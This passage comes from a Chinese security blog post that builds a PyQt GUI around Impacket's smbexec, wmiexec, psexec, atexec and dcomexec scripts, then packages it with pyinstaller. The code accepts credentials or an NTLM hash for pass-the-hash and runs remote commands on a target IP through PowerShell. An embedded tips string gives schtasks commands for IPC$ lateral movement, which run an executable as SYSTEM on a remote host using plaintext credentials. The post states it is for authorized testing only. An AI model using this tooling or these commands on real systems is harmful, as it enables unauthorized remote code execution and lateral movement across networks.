self.tips_button.isChecked():<br>           self.selected_module = <span class="hljs-string">&#x27;tips&#x27;</span><br>           tips_text = <span class="hljs-string">&#x27;本工具仅供合法授权的安全测试与教育研究使用，禁止任何非法用途。\n使用本工具产生的所有后果由用户自行承担，开发者不负任何责任。\n\n不要忘了IPC横向+计划任务\n利用条件：\n1.目标机开启了139和445端口\n2.目标主机管理员开启了ipc$默认共享\n操作：\n创建任务\nshell schtasks /create /s 192.168.3.142 /ru system /u sqladmin /p admin!@#45 /tn transfer /sc DAILY /tr C:\\tcp1.exe /f\n运行任务\nshell schtasks /run /s 192.168.3.142 /u sqladmin /p admin!@#45 /tn transfer /i\n删除任务\nschtasks /delete /s 192.168.3.142 /u sqladmin /p admin!@#45 /tn transfer /f&#x27;</span><br>           self.result_label.setPlainText(tips_text)<br>           self.tips_text_edit.setVisible(<span class="hljs-literal">True</span>)<br>           <span class="hljs-comment"># 隐藏输入控件</span><br>           self.domain_username_label.setVisible(<span class="hljs-literal">False</span>)<br>           self.domain_username_input.setVisible(<span class="hljs-literal">False</span>)<br>           self.password_label.setVisible(<span class="hljs-literal">False</span>)<br>           self.password_input.setVisible(<span class="hljs-literal">False</span>)<br>           self.hash_label.setVisible(<span class="hljs-literal">False</span>)<br>           self.hash_input.setVisible(<span class="hljs-literal">False</span>)<br>           self.ip_label.setVisible(<span class="hljs-literal">False</span>)<br>           self.ip_input.setVisible(<span class="hljs-literal">False</span>)<br>           self.command_label.setVisible(<span class="hljs-literal">False</span>)   <span class="hljs-comment"># 隐藏命令标签</span><br>           self.command_input.setVisible(<span class="hljs-literal">False</span>)    <span class="hljs-comment"># 隐藏命令输入框</span><br>           self.execute_button.setVisible(<span class="hljs-literal">False</span>)<br><br>        <span class="hljs-keyword">else</span>:<br>            self.tips_text_edit.setVisible(<span class="hljs-literal">False</span>)<br>            self.result_label.clear() <span class="hljs-comment"># 使用 clear() 清空 QTextEdit 的内容</span><br>            self.domain_username_label.setVisible(<span class="hljs-literal">True</span>)<br>            self.domain_username_input.setVisible(<span class="hljs-literal">True</span>)<br>            self.password_label.setVisible(<span class="hljs-literal">True</span>)<br>            self.password_input.setVisible(<span class="hljs-literal">True</span>)<br>            self.hash_label.setVisible(<span class="hljs-literal">True</span>)<br>            self.hash_input.setVisible(<span class="hljs-literal">True</span>)<br>            self.ip_label.setVisible(<span class="hljs-literal">True</span>)<br>            self.ip_input.setVisible(<span class="hljs-literal">True</span>)<br>            self.command_label.setVisible(<span class="hljs-literal">True</span>)  <span class="hljs-comment"># 显示命令标签</span><br>            self.command_input.setVisible(<span class="hljs-literal">True</span>)   <span class="hljs-comment"># 显示命令输入框</span><br>            self.execute_button.setVisible(<span class="hljs-literal">True</span>)<br><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">execute_command</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-comment"># 获取输入的内容</span><br>        domain_username = self.domain_username_input.text()<br>        password = self.password_input.text()<br>        ip = self.ip_input.text()<br>        hash_value = self.hash_input.text()  <span class="hljs-comment"># 获取hash输入框的内容</span><br>        command_to_execute = self.command_input.text() <span class="hljs-comment"># 获取命令输入框的内容</span><br><br>        <span class="hljs-comment"># 检查密码和hash值只能填写一个</span><br>        <span class="hljs-keyword">if</span> password <span class="hljs-keyword">and</span> hash_value:<br>            self.result_label.setPlainText(<span class="hljs-string">&quot;Please provide either password or hash, not both.&quot;</span>)<br>            <span class="hljs-keyword">return</span><br><br>        <span class="hljs-comment"># 格式化命令</span><br>        <span class="hljs-keyword">if</span> domain_username <span class="hljs-keyword">and</span> (password <span class="hljs-keyword">or</span> hash_value) <span class="hljs-keyword">and</span> ip <span class="hljs-keyword">and</span> self.selected_module <span class="hljs-keyword">and</span> self.selected_module != <span class="hljs-string">&#x27;tips&#x27;</span>:<br>            <span class="hljs-comment"># 获取当前目录</span><br>            app_path = os.path.dirname(os.path.abspath(__file__))<br><br>            <span class="hljs-comment"># 获取脚本路径</span><br>            module_path = os.path.join(app_path, self.selected_module)<br><br>            <span class="hljs-comment"># 构造命令</span><br>            <span class="hljs-keyword">if</span> hash_value:<br>                command = <span class="hljs-string">f&quot;python38 <span class="hljs-subst">&#123;module_path&#125;</span> -hashes :<span class="hljs-subst">&#123;hash_value&#125;</span> <span class="hljs-subst">&#123;domain_username&#125;</span>@<span class="hljs-subst">&#123;ip&#125;</span> <span class="hljs-subst">&#123;command_to_execute&#125;</span>&quot;</span><br>            <span class="hljs-keyword">else</span>:<br>                command = <span class="hljs-string">f&quot;python38 <span class="hljs-subst">&#123;module_path&#125;</span> <span class="hljs-subst">&#123;domain_username&#125;</span>:<span class="hljs-subst">&#123;password&#125;</span>@<span class="hljs-subst">&#123;ip&#125;</span> <span class="hljs-subst">&#123;command_to_execute&#125;</span>&quot;</span><br><br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-comment"># 使用 PowerShell 执行命令</span><br>                subprocess.Popen([<span class="hljs-string">&quot;powershell&quot;</span>, <span class="hljs-string">&quot;-Command&quot;</span>, command], shell=<span class="hljs-literal">True</span>)<br>                self.result_label.setPlainText(<span class="hljs-string">&quot;Command Executed&quot;</span>)<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                self.result_label.setPlainText(<span class="hljs-string">f&quot;Error: <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">elif</span> self.selected_module != <span class="hljs-string">&#x27;tips&#x27;</span>:<br>            self.result_label.setPlainText(<span class="hljs-string">&quot;Please fill in all fields.&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app = QApplication(sys.argv)<br>    ex = SmbExecGUI()<br>    ex.show()<br>    sys.exit(app.exec_())<br></code></pre></td></tr></table></figure>
+
+<p>打包指令：<br><code>pyinstaller --onefile --add-data &quot;smbexec.py;.&quot; --add-data &quot;wmiexec.py;.&quot; --add-data &quot;dcomexec.py;.&quot; --add-data &quot;psexec.py;.&quot; --add-data &quot;atexec.py;.&quot; --add-data &quot;ico.jpg;.&quot; --icon=ico.jpg gui.py</code></p>
+<p>成品展示：<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250122200552816.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E5%BC%80%E5%8F%91/" class="category-chain-item">开发</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%BC%80%E5%8F%91/" class="print-no-link">#开发</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Impacket-GUI开发</div>
+      <div>https://www.susec.xyz/2025/01/29/Impacket-GUI开发/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>suuuu</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年1月29日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/01/29/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial/" title="春秋云镜-initial">
+                        <span class="hidden-mobile">春秋云镜-initial</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
